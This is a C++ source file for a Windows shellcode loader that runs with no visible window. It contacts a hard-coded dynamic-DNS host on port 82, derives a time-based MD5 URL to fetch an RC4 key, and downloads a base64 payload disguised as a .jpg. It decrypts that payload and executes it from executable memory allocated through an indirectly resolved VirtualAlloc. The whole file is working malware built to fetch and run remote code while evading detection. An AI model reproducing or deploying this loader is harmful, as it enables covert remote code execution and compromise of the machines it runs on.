#include <windows.h>  
#include <string>
#include "b64/base64.h"
//#include <string.h>

#include "EsyGet/HttpRequest.h"
#include "Md5/md5.h"
#include <iostream>
#include <time.h>
#include "rc4/ARC4.h"

//data段可读写  
//#pragma comment(linker, "/section:.data,RWE")   
//不显示窗口  
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
//#pragma comment(linker, "/INCREMENTAL:NO")

const char target[] = "asufhcnfufkd.f3322.net";

char *ip;
const int  port = 82;
const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
typedef void(__stdcall *CODE) ();
char * shellcode = NULL;
int shellcode_size = 0; 
struct in_addr addr;
typedef PVOID (*M) (DWORD, DWORD, DWORD, DWORD);

void GetIP() {
	int ret;
	WSADATA wsaData;
	ret = WSAStartup(0x101, &wsaData);
	

	if (ret != 0)
	{
		ip = (char *)target;
		return;
	}
	hostent* host;
	host = gethostbyname(target);
	if (!host)
	{
		ip = (char *)target;
		MessageBox(0, ip, ip, 0);
		return;
	}
	addr.s_addr = *(unsigned long *)host->h_addr;
	ip = inet_ntoa(addr);
	MessageBox(0, ip, ip, 0);
	WSACleanup();
	return;
}

std::string GenerateUri()
{
	time_t myt = time(NULL);
	int key = int(int(myt) / 100);
	std::string u = string(obscure) + std::to_string(key);
	return MD5(u).toStr();
}
void GetShellCodeSize()
{
	std::string host = std::string(ip);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/my/get_size");
	std::string body = httpReq.getBody(res);
	shellcode_size = std::atoi(body.c_str());
	
	shellcode = (char *)malloc(shellcode_size);
	
}
std::string GetKey()
{
	GetShellCodeSize();
	
	std::string host = std::string(ip);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/"+ GenerateUri());

	std::string body = httpReq.getBody(res);
	return body;
}
void LoadShellCode(char *shellcode)
{
	HMODULE hDllLib = LoadLibrary("Kernel32.dll");
	FARPROC fpFun = GetProcAddress(hDllLib, "VirtualAlloc");
	M VirtualAlloc_ = (M)*fpFun;
	PVOID p = NULL;
	p = VirtualAlloc_(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy_s(p, shellcode_size, shellcode, shellcode_size);
	
	CODE code = (CODE)p;
	code();
	
}

void DecPayload(std::string key)
{
	
	std::string host = std::string(ip);
	HttpRequest httpReq(host, port);
	time_t myt = time(NULL);
	int filename = int(int(myt) / 100);

	std::string res = httpReq.HttpGet("/"+ std::to_string(filename)+".jpg");
	std::string body = httpReq.getBody(res);
	std::string payload = base64_decode(body);
	char * c_payload = (char *)malloc(shellcode_size);
	memcpy_s(c_payload, shellcode_size, payload.c_str(), shellcode_size);
	ARC4 rc4;
	if (key.length() == 0) {
		return;
	}
	rc4.setKey((unsigned char*)key.c_str(), key.length());
	rc4.encrypt(c_payload, shellcode, shellcode_size);

	LoadShellCode(shellcode);
	
}

int main()
{  
	GetIP();
	//如果要不安装服务运行，请直接DecPayload(GetKey());
	//ServiceInstall();
	DecPayload(GetKey());
	
    return 0;  
}  